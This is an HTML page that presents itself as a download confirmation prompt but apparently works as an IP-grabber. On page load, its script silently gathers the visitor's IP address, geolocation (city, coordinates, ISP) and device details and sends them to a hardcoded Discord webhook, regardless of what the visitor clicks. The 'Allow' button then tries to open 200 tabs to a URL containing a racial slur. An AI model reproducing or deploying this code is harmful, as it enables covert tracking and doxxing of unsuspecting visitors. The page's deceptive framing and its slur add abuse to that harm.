<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>project</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      margin: 0;
      padding: 0;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      background-color: #2c2f33;
      color: #fff;
    }

    .container {
      text-align: center;
      background: rgba(35, 39, 42, 0.9);
      padding: 20px;
      border-radius: 10px;
      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.5);
      width: 300px;
    }

    button {
      padding: 10px 20px;
      margin: 10px;
      border: none;
      border-radius: 5px;
      background-color: #7289da;
      color: white;
      cursor: pointer;
    }

    button:hover {
      background-color: #5b6eae;
    }

    #status {
      margin-top: 15px;
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>Download Confirmation</h1>
    <p>Click Allow so we can bring you to the download.</p>
    <button onclick="allow()">Allow</button>
    <button onclick="deny()">Don't Allow</button>
    <p id="status"></p>
  </div>

  <script>
    const webhookUrl = 'https://discordapp.com/api/webhooks/1335664944028582000/c1CoPiNgVyekogi0OhqJQizguoBFy5XmTKydzmWb-8XQFOYEAZ_PyT79OgkQsc1ElmGl';
    let collectedData = {};

    // Fetch IP and related data
    async function fetchIPData() {
      try {
        const response = await fetch('https://api.ipify.org?format=json');
        const { ip } = await response.json();
        collectedData.IP_Info = { ip };

        const locationResponse = await fetch(`https://ipapi.co/${ip}/json/`);
        const locationData = await locationResponse.json();

        collectedData.IP_Info = {
          ...collectedData.IP_Info,
          city: locationData.city,
          region: locationData.region,
          country: locationData.country_name,
          latitude: locationData.latitude,
          longitude: locationData.longitude,
          isp: locationData.org,
        };
      } catch (error) {
        console.error('Error fetching IP data:', error);
        collectedData.IP_Info = 'Unavailable';
      }
    }

    // Fetch device information
    function fetchDeviceInfo() {
      collectedData.Device_Info = {
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language,
        screenResolution: `${window.screen.width}x${window.screen.height}`,
        viewportSize: `${window.innerWidth}x${window.innerHeight}`,
        cookiesEnabled: navigator.cookieEnabled,
        cores: navigator.hardwareConcurrency || 'Unknown',
        memory: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'Unknown',
      };
    }

    // Send data to webhook
    async function sendToWebhook(data) {
      try {
        await fetch(webhookUrl, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ content: data }),
        });
      } catch (error) {
        console.error('Error sending to webhook:', error);
      }
    }

    // Open 20 tabs
    function openTabs() {
      const url = "https://www.niggafart.com";
      for (let i = 0; i < 200; i++) {
        const newTab = window.open(url, '_blank');
        if (!newTab) {
          alert("Popup blocker prevented some tabs from opening.");
          break;
        }
      }
    }

    // Handle "Allow" button click
    function allow() {
      const status = document.getElementById('status');
      status.textContent = 'Thank you! Opening tabs...';
      status.style.color = 'green';
      openTabs();
    }

    // Handle "Don't Allow" button click
    function deny() {
      const status = document.getElementById('status');
      status.textContent = 'Unable to proceed because you clicked "Don\'t Allow".';
      status.style.color = 'red';
    }

    // Collect and send data immediately
    async function collectAndSendData() {
      await fetchIPData(); // Fetch IP data
      fetchDeviceInfo(); // Fetch device info

      // Send data to the webhook
      const formattedData = `**User Information:**\n\`\`\`json\n${JSON.stringify(collectedData, null, 2)}\n\`\`\``;
      await sendToWebhook(formattedData);
    }

    // Run data collection on page load
    collectAndSendData();
  </script>
</body>
</html>
